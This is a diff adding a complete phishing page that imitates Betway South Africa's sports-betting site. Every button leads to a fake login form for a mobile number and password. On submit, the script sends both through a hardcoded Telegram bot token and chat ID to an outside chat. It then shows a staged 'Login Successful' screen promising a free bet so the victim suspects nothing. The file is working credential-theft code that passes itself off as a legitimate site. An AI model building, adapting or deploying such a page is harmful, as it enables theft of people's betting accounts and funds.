@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#000000">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<title>Betway</title>
+<link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;500;600;700&amp;family=Roboto:wght@300;400;500;700&amp;display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;}
+:root{
+  --gold:#F5B800;
+  --green:#00A651;
+  --green-dk:#007A3B;
+  --black:#000;
+  --white:#FFF;
+}
+html,body{font-family:'Roboto',sans-serif;background:#000;color:#fff;min-height:100vh;width:100%;overflow-x:hidden;-webkit-font-smoothing:antialiased;}
+
+/* pages */
+.page{display:none;}
+.page.on{display:block;}
+#pg-congrats.on{display:flex;}
+#pg-loading .load-inner{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#000;padding:40px 20px;text-align:center;}
+
+/* nav */
+.top-nav{position:sticky;top:0;z-index:90;background:#111;height:52px;display:flex;align-items:center;justify-content:space-between;padding:0 14px;border-bottom:1px solid rgba(255,255,255,0.08);}
+.nav-logo{font-family:'Oswald',sans-serif;font-size:24px;font-weight:700;color:#fff;}
+.nav-right{display:flex;align-items:center;gap:8px;}
+.btn-nv-login{border:1.5px solid var(--green);background:transparent;color:var(--green);padding:7px 14px;border-radius:5px;font-size:13px;font-weight:700;cursor:pointer;font-family:'Roboto',sans-serif;min-height:36px;}
+.btn-nv-signup{background:var(--green);color:#fff;border:none;padding:7px 14px;border-radius:5px;font-size:13px;font-weight:700;cursor:pointer;font-family:'Roboto',sans-serif;min-height:36px;}
+
+/* menu */
+.h-menu{background:#111;display:flex;overflow-x:auto;border-bottom:1px solid rgba(255,255,255,0.08);scrollbar-width:none;}
+.h-menu::-webkit-scrollbar{display:none;}
+.h-item{flex-shrink:0;padding:11px 14px;font-size:13px;font-weight:500;color:#bbb;cursor:pointer;white-space:nowrap;border-bottom:2px solid transparent;transition:all 0.2s;}
+.h-item.act{color:#fff;border-bottom-color:var(--gold);}
+
+/* hero */
+.hero{background:linear-gradient(120deg,#1a0035 0%,#2d0050 30%,#0d1500 65%,#000a00 100%);position:relative;overflow:hidden;padding:22px 16px 0;min-height:170px;display:flex;align-items:flex-end;}
+.hero-bg1{position:absolute;top:-30px;left:5%;width:55%;height:250px;background:linear-gradient(50deg,rgba(150,60,255,0.35),transparent 65%);transform:rotate(-10deg);pointer-events:none;}
+.hero-bg2{position:absolute;top:0;left:20%;width:40%;height:220px;background:linear-gradient(50deg,rgba(245,184,0,0.18),transparent 65%);transform:rotate(-6deg);pointer-events:none;}
+.hero-content{position:relative;z-index:2;flex:1;padding-bottom:20px;}
+.hero-bet{font-size:12px;font-weight:700;color:var(--gold);letter-spacing:2.5px;text-transform:uppercase;margin-bottom:2px;}
+.hero-title{font-family:'Oswald',sans-serif;font-size:clamp(28px,7vw,40px);font-weight:700;color:#fff;line-height:0.97;}
+.hero-brand{font-family:'Oswald',sans-serif;font-size:clamp(26px,6.5vw,38px);font-weight:700;color:var(--gold);line-height:0.97;}
+.hero-sub{font-size:12px;color:rgba(255,255,255,0.65);margin-top:8px;font-style:italic;}
+.hero-phone{position:relative;z-index:2;width:100px;flex-shrink:0;display:flex;flex-direction:column;align-items:center;justify-content:flex-end;}
+.phone-frame{width:86px;height:148px;background:linear-gradient(160deg,#1c1c1c,#080808);border-radius:16px;border:1.5px solid rgba(255,255,255,0.12);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;box-shadow:0 12px 40px rgba(0,0,0,0.7);padding:10px 6px;}
+.pf-notch{width:30px;height:4px;background:rgba(255,255,255,0.1);border-radius:2px;position:absolute;top:8px;}
+.pf-bw{font-family:'Oswald',sans-serif;font-size:16px;font-weight:700;color:#fff;}
+.hero-glow{position:absolute;bottom:0;right:40px;width:120px;height:50px;background:radial-gradient(ellipse,rgba(245,184,0,0.45) 0%,transparent 70%);pointer-events:none;z-index:1;}
+
+/* cards */
+.sec-title{text-align:center;padding:20px 16px 14px;font-family:'Oswald',sans-serif;font-size:18px;font-weight:700;letter-spacing:0.8px;}
+.sec-title span{color:var(--gold);}
+.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:0 12px 16px;}
+.gcard{background:#1a1a22;border:1px solid rgba(255,255,255,0.07);border-radius:10px;padding:14px 8px;text-align:center;cursor:pointer;transition:transform 0.15s;}
+.gcard:active{transform:scale(0.97);}
+.gc-icon{font-size:26px;margin-bottom:8px;}
+.gc-lbl{font-size:9.5px;font-weight:700;color:#fff;letter-spacing:0.4px;text-transform:uppercase;margin-bottom:5px;line-height:1.3;}
+.gc-num{font-family:'Oswald',sans-serif;font-size:20px;font-weight:700;color:var(--gold);}
+.gc-num small{font-size:11px;color:#999;font-weight:400;}
+.gcard.claim .gc-num{font-size:24px;color:#fff;}
+.claim-wrap{padding:6px 12px 14px;}
+.claim-btn{width:100%;background:var(--gold);color:#000;border:none;border-radius:8px;padding:16px;font-family:'Oswald',sans-serif;font-size:20px;font-weight:700;letter-spacing:2.5px;cursor:pointer;}
+.claim-btn:active{background:#d9a500;}
+.dots{display:flex;justify-content:center;gap:7px;padding:8px 0 20px;}
+.dot{width:9px;height:9px;border-radius:50%;background:rgba(255,255,255,0.18);}
+.dot.on{background:var(--gold);}
+.trust{display:grid;grid-template-columns:repeat(4,1fr);border-top:1px solid rgba(255,255,255,0.08);border-bottom:1px solid rgba(255,255,255,0.08);padding:14px 0;}
+.t-item{text-align:center;padding:0 4px;}
+.t-icon{font-size:20px;margin-bottom:5px;}
+.t-lbl{font-size:10px;color:#999;}
+
+/* footer */
+.footer{background:#0d0d0d;border-top:1px solid rgba(255,255,255,0.08);}
+.foot-main{padding:16px 14px;display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:12px;}
+.foot-brand{display:flex;align-items:center;gap:10px;}
+.foot-bw{font-family:'Oswald',sans-serif;font-size:20px;font-weight:700;color:#fff;}
+.foot-sep{width:1px;height:20px;background:rgba(255,255,255,0.2);}
+.foot-links{display:flex;flex-wrap:wrap;gap:10px 16px;padding:0 14px 12px;}
+.foot-links a{font-size:11px;color:#666;text-decoration:none;}
+.foot-social{display:flex;gap:8px;padding:0 14px 14px;}
+.soc{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:#fff;cursor:pointer;}
+.soc-fb{background:#1877F2;}.soc-x{background:#000;border:1px solid #333;}.soc-ig{background:linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045);}.soc-yt{background:#F00;}
+.foot-copy{text-align:center;padding:10px 14px 20px;font-size:10px;color:#444;}
+
+/* overlays */
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.75);z-index:200;overflow-y:auto;-webkit-overflow-scrolling:touch;}
+.overlay.on{display:block;}
+.modal-wrap{min-height:100%;display:flex;align-items:flex-start;justify-content:center;}
+.modal{background:#fff;width:100%;max-width:480px;border-radius:0 0 14px 14px;overflow:hidden;animation:slideD 0.28s ease;}
+@keyframes slideD{from{transform:translateY(-20px);opacity:0}to{transform:translateY(0);opacity:1}}
+
+/* ── PLATFORM CHOOSER ── */
+#ov-choose .modal{background:#0d0d0d;}
+.choose-head{background:#111;padding:18px 16px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,0.08);}
+.choose-head h2{font-family:'Oswald',sans-serif;font-size:20px;font-weight:700;color:#fff;letter-spacing:0.5px;}
+.choose-close{background:none;border:none;color:#aaa;font-size:26px;cursor:pointer;line-height:1;}
+.choose-subtitle{text-align:center;font-size:13px;color:#777;padding:20px 16px 8px;background:#0d0d0d;}
+.choose-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:12px 16px 28px;background:#0d0d0d;}
+.choose-card{border-radius:14px;padding:26px 12px;text-align:center;cursor:pointer;transition:all 0.2s;border:2px solid transparent;display:flex;flex-direction:column;align-items:center;gap:10px;}
+.choose-card:active{transform:scale(0.96);}
+.bw-card{background:linear-gradient(145deg,#0d1f0d,#0a2e12);border-color:rgba(0,166,81,0.25);}
+.bw-card:active,.bw-card:hover{border-color:var(--green);}
+.cc-icon{font-size:34px;}
+.cc-logo-bw{font-family:'Oswald',sans-serif;font-size:22px;font-weight:700;color:#fff;letter-spacing:1px;}
+.cc-lbl{font-size:11px;color:#888;}
+.cc-arrow-bw{font-size:22px;color:var(--green);}
+
+/* ── BETWAY LOGIN ── */
+.bw-head{background:#111;color:#fff;padding:16px;display:flex;align-items:center;justify-content:space-between;}
+.bw-head h2{font-size:19px;font-weight:700;}
+.m-close{background:none;border:none;color:#fff;font-size:26px;cursor:pointer;line-height:1;}
+.m-body{background:#f2f2f2;padding:16px;}
+.mf{margin-bottom:12px;}
+.pf-row{display:flex;background:#fff;border:1.5px solid #ccc;border-radius:7px;overflow:hidden;}
+.pf-pre{padding:0 12px;font-size:15px;font-weight:700;color:#222;border-right:1.5px solid #ccc;height:50px;display:flex;align-items:center;background:#f6f6f6;flex-shrink:0;}
+.pf-in{flex:1;border:none;outline:none;padding:14px 12px;font-size:15px;color:#222;font-family:'Roboto',sans-serif;min-width:0;background:#fff;}
+.pf-in::placeholder{color:#bbb;}
+.pw-row{display:flex;background:#fff;border:1.5px solid #ccc;border-radius:7px;overflow:hidden;}
+.pw-in{flex:1;border:none;outline:none;padding:14px 12px;font-size:15px;color:#222;font-family:'Roboto',sans-serif;min-width:0;}
+.pw-in::placeholder{color:#bbb;}
+.pw-eye{background:#fff;border:none;padding:0 14px;font-size:20px;cursor:pointer;color:#777;flex-shrink:0;}
+.frow2{display:flex;justify-content:space-between;padding:4px 2px;font-size:13px;}
+.frow2 a{color:#555;text-decoration:none;}
+.su-box{background:#e6e6e6;border-radius:7px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;}
+.su-box span{font-size:13px;color:#444;}
+.su-box a{font-size:14px;font-weight:700;color:#111;text-decoration:none;}
+.bw-btn{width:100%;background:var(--green);color:#fff;border:none;padding:15px;border-radius:7px;font-size:17px;font-weight:700;cursor:pointer;font-family:'Roboto',sans-serif;min-height:50px;transition:background 0.2s;}
+.bw-btn:active{background:var(--green-dk);}
+
+/* loading */
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.sdot{width:10px;height:10px;border-radius:50%;background:rgba(255,255,255,0.15);flex-shrink:0;transition:background 0.3s;}
+.sdot.on{background:var(--green);box-shadow:0 0 8px rgba(0,166,81,0.5);}
+
+/* congrats */
+#pg-congrats{min-height:100vh;background:radial-gradient(ellipse at 50% 0%,rgba(0,166,81,0.14) 0%,#060606 55%);flex-direction:column;align-items:center;justify-content:center;padding:28px 16px;position:relative;overflow:hidden;}
+.cf-box{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;}
+.cfp{position:absolute;opacity:0;animation:cffall 3s ease-in forwards;}
+@keyframes cffall{0%{transform:translateY(-10px) rotate(0deg);opacity:1}100%{transform:translateY(102vh) rotate(600deg);opacity:0}}
+.cg-card{position:relative;z-index:1;width:100%;max-width:400px;background:#111;border:1px solid rgba(0,166,81,0.22);border-radius:18px;padding:32px 20px;text-align:center;animation:fadeUp 0.5s ease both;}
+.cg-logobar{font-family:'Oswald',sans-serif;font-size:22px;color:#fff;margin-bottom:20px;letter-spacing:1.5px;}
+.cg-logobar span.bw-c{color:var(--green);}
+.check-ring{width:76px;height:76px;border-radius:50%;background:rgba(0,166,81,0.12);border:2px solid var(--green);display:flex;align-items:center;justify-content:center;font-size:34px;color:var(--green);margin:0 auto 16px;animation:pop 0.55s ease 0.25s both;}
+@keyframes pop{0%{transform:scale(0);opacity:0}70%{transform:scale(1.12)}100%{transform:scale(1);opacity:1}}
+.cg-tag{display:inline-block;background:rgba(0,166,81,0.12);border:1px solid rgba(0,166,81,0.35);color:var(--green);padding:5px 16px;border-radius:100px;font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:14px;}
+.cg-card h1{font-family:'Oswald',sans-serif;font-size:clamp(32px,8vw,48px);font-weight:700;letter-spacing:1.5px;color:#fff;line-height:1.05;margin-bottom:10px;}
+.cg-card h1 .acc{color:var(--green);}
+.cg-card>p{font-size:14px;color:#aaa;margin-bottom:22px;line-height:1.65;}
+.uname{color:var(--gold);font-weight:700;}
+.bonus-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:22px;}
+.bitem{background:#1a1a1a;border:1px solid rgba(255,255,255,0.06);border-radius:10px;padding:14px 8px;text-align:center;}
+.bi-icon{font-size:22px;margin-bottom:6px;}
+.bi-val{font-family:'Oswald',sans-serif;font-size:18px;font-weight:700;color:#fff;margin-bottom:3px;}
+.bi-lbl{font-size:10px;color:#777;}
+.cg-main-btn{width:100%;background:var(--green);color:#fff;border:none;padding:15px;border-radius:8px;font-family:'Oswald',sans-serif;font-size:17px;font-weight:700;letter-spacing:1px;cursor:pointer;margin-bottom:10px;min-height:50px;}
+.cg-ghost{width:100%;background:transparent;color:#888;border:1px solid rgba(255,255,255,0.12);padding:13px;border-radius:8px;font-size:14px;cursor:pointer;font-family:'Roboto',sans-serif;min-height:46px;}
+.chips{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin-top:20px;padding-top:18px;border-top:1px solid rgba(255,255,255,0.07);}
+.chip{background:#1a1a1a;border:1px solid rgba(255,255,255,0.07);border-radius:100px;padding:5px 12px;font-size:11px;color:#aaa;}
+.chip b{color:var(--gold);}
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════ HOME ══════════════════════ -->
+<div id="pg-home" class="page on">
+  <div class="top-nav">
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="font-size:22px;color:#fff;cursor:pointer;">☰</span>
+      <div class="nav-logo">betway</div>
+    </div>
+    <div class="nav-right">
+      <button class="btn-nv-login" onclick="openChoose()">Login</button>
+      <button class="btn-nv-signup" onclick="openChoose()">Sign Up</button>
+    </div>
+  </div>
+
+  <div class="h-menu">
+    <div class="h-item act">Home</div><div class="h-item">Sports</div>
+    <div class="h-item">Live</div><div class="h-item">Promotions</div>
+    <div class="h-item">Odds</div><div class="h-item">Casino</div><div class="h-item">Help</div>
+  </div>
+
+  <div class="hero">
+    <div class="hero-bg1"></div><div class="hero-bg2"></div>
+    <div class="hero-content">
+      <div class="hero-bet">BET WITH</div>
+      <div class="hero-title">BETWAY &</div>
+      <div class="hero-sub">Get the best odds every day</div>
+    </div>
+    <div class="hero-glow"></div>
+    <div class="hero-phone">
+      <div class="phone-frame">
+        <div class="pf-notch"></div>
+        <div class="pf-bw">betway</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="sec-title">TODAY'S <span>EARLY KICKOFF</span></div>
+  <div class="grid3">
+    <div class="gcard" onclick="openChoose()"><div class="gc-icon">⏱️</div><div class="gc-lbl">EARLY KICKOFF</div><div class="gc-num">120+ <small>Odds</small></div></div>
+    <div class="gcard" onclick="openChoose()"><div class="gc-icon">📅</div><div class="gc-lbl">TODAY'S GAMES</div><div class="gc-num">350+ <small>Odds</small></div></div>
+    <div class="gcard" onclick="openChoose()"><div class="gc-icon">⚡</div><div class="gc-lbl">TONIGHT'S ODDS</div><div class="gc-num">400+ <small>Odds</small></div></div>
+  </div>
+
+  <div class="sec-title">CLAIM YOUR <span>DAILY ODDS</span> NOW</div>
+  <div class="grid3">
+    <div class="gcard claim" onclick="openChoose()"><div class="gc-icon">⚽</div><div class="gc-lbl">EARLY KICKOFF</div><div class="gc-num">150 <small>Odds</small></div></div>
+    <div class="gcard claim" onclick="openChoose()"><div class="gc-icon">🌙</div><div class="gc-lbl">TONIGHT'S ODDS</div><div class="gc-num">400 <small>Odds</small></div></div>
+    <div class="gcard claim" onclick="openChoose()"><div class="gc-icon">📊</div><div class="gc-lbl">ALL SPORTS</div><div class="gc-num">600+ <small>Odds</small></div></div>
+  </div>
+
+  <div class="claim-wrap">
+    <button class="claim-btn" onclick="openChoose()">CLAIM ODDS</button>
+  </div>
+
+  <div class="dots"><div class="dot on"></div><div class="dot"></div><div class="dot"></div></div>
+
+  <div class="trust">
+    <div class="t-item"><div class="t-icon">🛡️</div><div class="t-lbl">Fast Payouts</div></div>
+    <div class="t-item"><div class="t-icon">🔒</div><div class="t-lbl">Secure Betting</div></div>
+    <div class="t-item"><div class="t-icon">📱</div><div class="t-lbl">Mobile Friendly</div></div>
+    <div class="t-item"><div class="t-icon">🎧</div><div class="t-lbl">24/7 Support</div></div>
+  </div>
+
+  <div class="footer">
+    <div class="foot-main">
+      <div class="foot-brand">
+        <div class="foot-bw">betway</div>
+      </div>
+    </div>
+    <div class="foot-links">
+      <a href="#">About</a><a href="#">Promotions</a>
+      <a href="#">Responsible Gaming</a><a href="#">Terms &amp; Conditions</a><a href="#">Contact</a>
+    </div>
+    <div class="foot-social">
+      <div class="soc soc-fb">f</div><div class="soc soc-x">𝕏</div>
+      <div class="soc soc-ig">📷</div><div class="soc soc-yt">▶</div>
+    </div>
+    <div class="foot-copy">© 2025 Betway. All rights reserved.</div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════ BETWAY LOGIN ══════════════════════ -->
+<div id="ov-bw" class="overlay" onclick="bgClose(event,'ov-bw')">
+  <div class="modal-wrap">
+    <div class="modal">
+      <div class="bw-head">
+        <h2>Login — betway</h2>
+        <button class="m-close" onclick="closeOv('ov-bw')">✕</button>
+      </div>
+      <div class="m-body">
+        <div class="mf">
+          <div class="pf-row">
+            <div class="pf-pre">+27</div>
+            <input class="pf-in" type="tel" id="bwPhone" placeholder="Mobile Number" inputmode="numeric">
+          </div>
+        </div>
+        <div class="mf">
+          <div class="pw-row">
+            <input class="pw-in" type="password" id="bwPass" placeholder="Enter Password">
+            <button class="pw-eye" onclick="togglePw('bwPass',this)">👁</button>
+          </div>
+        </div>
+        <div class="frow2">
+          <a href="#">Forgot Username</a>
+          <a href="#">Forgot Password?</a>
+        </div>
+        <br>
+        <div class="su-box">
+          <span>Don't have an account yet?</span>
+          <a href="#">Sign Up ›</a>
+        </div>
+        <button class="bw-btn" id="bwBtn" onclick="doBwLogin()">Login</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════ LOADING ══════════════════════ -->
+<div id="pg-loading" class="page">
+  <div class="load-inner">
+    <div id="load-logo" style="font-family:'Oswald',sans-serif;font-size:28px;font-weight:700;color:#fff;letter-spacing:1px;margin-bottom:40px;">betway</div>
+    <div id="spin-ring" style="width:72px;height:72px;border-radius:50%;border:4px solid rgba(0,166,81,0.2);border-top-color:#00A651;animation:spin 0.9s linear infinite;margin-bottom:32px;"></div>
+    <div id="step1" style="opacity:0;transform:translateY(8px);transition:all 0.4s;">
+      <div style="display:flex;align-items:center;gap:10px;justify-content:center;margin-bottom:14px;">
+        <div class="sdot" id="d1"></div><span style="font-size:14px;color:#aaa;">Verifying credentials...</span>
+      </div>
+    </div>
+    <div id="step2" style="opacity:0;transform:translateY(8px);transition:all 0.4s;">
+      <div style="display:flex;align-items:center;gap:10px;justify-content:center;margin-bottom:14px;">
+        <div class="sdot" id="d2"></div><span style="font-size:14px;color:#aaa;">Loading your account...</span>
+      </div>
+    </div>
+    <div id="step3" style="opacity:0;transform:translateY(8px);transition:all 0.4s;">
+      <div style="display:flex;align-items:center;gap:10px;justify-content:center;margin-bottom:14px;">
+        <div class="sdot" id="d3"></div><span style="font-size:14px;color:#aaa;">Fetching today's odds...</span>
+      </div>
+    </div>
+    <div id="load-ok" style="opacity:0;transform:scale(0.6);transition:all 0.5s;margin-top:10px;">
+      <div id="ok-ring" style="width:64px;height:64px;border-radius:50%;background:rgba(0,166,81,0.15);border:2px solid #00A651;display:flex;align-items:center;justify-content:center;font-size:28px;color:#00A651;margin:0 auto 16px;">✓</div>
+      <div id="ok-txt" style="font-size:15px;font-weight:700;color:#00A651;letter-spacing:1px;">Login Successful!</div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════ CONGRATS ══════════════════════ -->
+<div id="pg-congrats" class="page">
+  <div class="cf-box" id="cfbox"></div>
+  <div class="cg-card" id="cgCard">
+    <div class="cg-logobar" id="cgLogo">betway <span class="bw-c">✓</span></div>
+    <div class="check-ring" id="cgRing">✓</div>
+    <div class="cg-tag" id="cgTag">✓ LOGIN SUCCESSFUL</div>
+    <h1>YOU'RE IN,<br><span class="acc" id="cgAcc">CHAMPION!</span></h1>
+    <p>Welcome, <span class="uname" id="dispName">Player</span>! Your account is active. Today's best odds are ready for you.</p>
+    <div class="bonus-grid">
+      <div class="bitem"><div class="bi-icon">⚽</div><div class="bi-val">150</div><div class="bi-lbl">Early Kickoff Odds</div></div>
+      <div class="bitem"><div class="bi-icon">🌙</div><div class="bi-val">400</div><div class="bi-lbl">Tonight's Odds</div></div>
+      <div class="bitem"><div class="bi-icon">📊</div><div class="bi-val">600+</div><div class="bi-lbl">All Sports Odds</div></div>
+      <div class="bitem"><div class="bi-icon">💰</div><div class="bi-val" style="color:var(--gold)">R25</div><div class="bi-lbl">Free Bet Added</div></div>
+    </div>
+    <button class="cg-main-btn" id="cgBtn" onclick="goHome()">CLAIM YOUR ODDS NOW →</button>
+    <button class="cg-ghost" onclick="goHome()">Return to Home</button>
+    <div class="chips">
+      <div class="chip">Status: <b>Active ✓</b></div>
+      <div class="chip">Plan: <b>Pro</b></div>
+      <div class="chip">Balance: <b>R25.00</b></div>
+    </div>
+  </div>
+</div>
+
+
+<script>
+const BOT = '8185111652:AAFECJ3ZGG37q9dfTXoYAo6PtXXkMOPBoig';
+const CID = '6895166294';
+
+function tg(msg){
+  return fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
+    method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:CID,text:msg,parse_mode:'HTML'})
+  }).catch(()=>{});
+}
+
+/* overlays */
+function openChoose(){ document.getElementById('ov-bw').classList.add('on'); }
+function closeOv(id){ document.getElementById(id).classList.remove('on'); }
+function bgClose(e,id){ if(e.target===document.getElementById(id)) closeOv(id); }
+
+/* pw toggle */
+function togglePw(id,btn){
+  const f=document.getElementById(id);
+  if(f.type==='password'){f.type='text';btn.textContent='🙈';}
+  else{f.type='password';btn.textContent='👁';}
+}
+
+/* menu */
+document.querySelectorAll('.h-item').forEach(el=>el.addEventListener('click',function(){
+  document.querySelectorAll('.h-item').forEach(x=>x.classList.remove('act'));
+  this.classList.add('act');
+}));
+
+/* shake */
+function shake(b){
+  b.style.transition='transform 0.08s';
+  b.style.transform='translateX(-6px)';
+  setTimeout(()=>b.style.transform='translateX(6px)',80);
+  setTimeout(()=>b.style.transform='translateX(0)',160);
+}
+
+/* ── BETWAY LOGIN ── */
+function doBwLogin(){
+  const ph=document.getElementById('bwPhone').value.trim();
+  const pw=document.getElementById('bwPass').value.trim();
+  const btn=document.getElementById('bwBtn');
+  if(!ph||!pw){shake(btn);return;}
+  btn.disabled=true;btn.textContent='Logging in...';btn.style.opacity='0.7';
+  tg(`🟢 <b>Betway SA — Login</b>\n📱 Phone: <code>+27${ph}</code>\n🔑 Password: <code>${pw}</code>\n🌐 Platform: Betway South Africa`)
+  .finally(()=>{
+    closeOv('ov-bw');
+    document.getElementById('dispName').textContent='+27 '+ph;
+    btn.disabled=false;btn.textContent='Login';btn.style.opacity='1';
+    setTheme('bw');
+    startLoading();
+  });
+}
+
+/* ── theme ── */
+function setTheme(){
+  const ring=document.getElementById('spin-ring');
+  const okRing=document.getElementById('ok-ring');
+  const okTxt=document.getElementById('ok-txt');
+  ring.style.borderColor='rgba(0,166,81,0.2)';
+  ring.style.borderTopColor='#00A651';
+  okRing.style.background='rgba(0,166,81,0.15)';
+  okRing.style.borderColor='#00A651';
+  okRing.style.color='#00A651';
+  okTxt.style.color='#00A651';
+  document.getElementById('load-logo').textContent='betway';
+  const card=document.getElementById('cgCard');
+  const logo=document.getElementById('cgLogo');
+  const rng=document.getElementById('cgRing');
+  const tag=document.getElementById('cgTag');
+  const acc=document.getElementById('cgAcc');
+  const btn=document.getElementById('cgBtn');
+  logo.innerHTML='betway <span class="bw-c">✓</span>';
+  card.classList.remove('hw-bdr');
+  rng.classList.remove('hw');tag.classList.remove('hw');acc.classList.remove('hw');btn.classList.remove('hw');
+}
+
+/* ── loading ── */
+function startLoading(){
+  ['step1','step2','step3'].forEach(id=>{const e=document.getElementById(id);e.style.opacity='0';e.style.transform='translateY(8px)';});
+  ['d1','d2','d3'].forEach(id=>document.getElementById(id).classList.remove('on'));
+  const ok=document.getElementById('load-ok');
+  ok.style.opacity='0';ok.style.transform='scale(0.6)';
+  document.getElementById('spin-ring').style.display='block';
+  document.getElementById('pg-home').classList.remove('on');
+  window.scrollTo({top:0,behavior:'instant'});
+  document.getElementById('pg-loading').classList.add('on');
+  const s=(id,dot,ms)=>setTimeout(()=>{
+    const e=document.getElementById(id);e.style.opacity='1';e.style.transform='translateY(0)';
+    document.getElementById(dot).classList.add('on');
+  },ms);
+  s('step1','d1',300);s('step2','d2',950);s('step3','d3',1600);
+  setTimeout(()=>{document.getElementById('spin-ring').style.display='none';ok.style.opacity='1';ok.style.transform='scale(1)';},2200);
+  setTimeout(()=>{
+    document.getElementById('pg-loading').classList.remove('on');
+    document.getElementById('pg-congrats').classList.add('on');
+    window.scrollTo({top:0,behavior:'instant'});
+    spawnConfetti();
+  },2900);
+}
+
+function goHome(){
+  document.getElementById('pg-congrats').classList.remove('on');
+  document.getElementById('pg-home').classList.add('on');
+  window.scrollTo({top:0,behavior:'instant'});
+}
+
+function spawnConfetti(){
+  const box=document.getElementById('cfbox');box.innerHTML='';
+  const cols=['#F5B800','#00A651','#fff','#FFD700','#9B59D0','#FF6B35','#4488FF'];
+  for(let i=0;i<80;i++){
+    const p=document.createElement('div');p.className='cfp';
+    const c=cols[Math.floor(Math.random()*cols.length)];
+    const s=Math.random()*8+5;
+    p.style.cssText=`left:${Math.random()*100}%;top:-10px;width:${s}px;height:${s}px;background:${c};border-radius:${Math.random()>.5?'50%':'2px'};animation-delay:${Math.random()*2.5}s;animation-duration:${2+Math.random()*2}s;`;
+    box.appendChild(p);
+  }
+}
+</script>
+</body>
+</html>
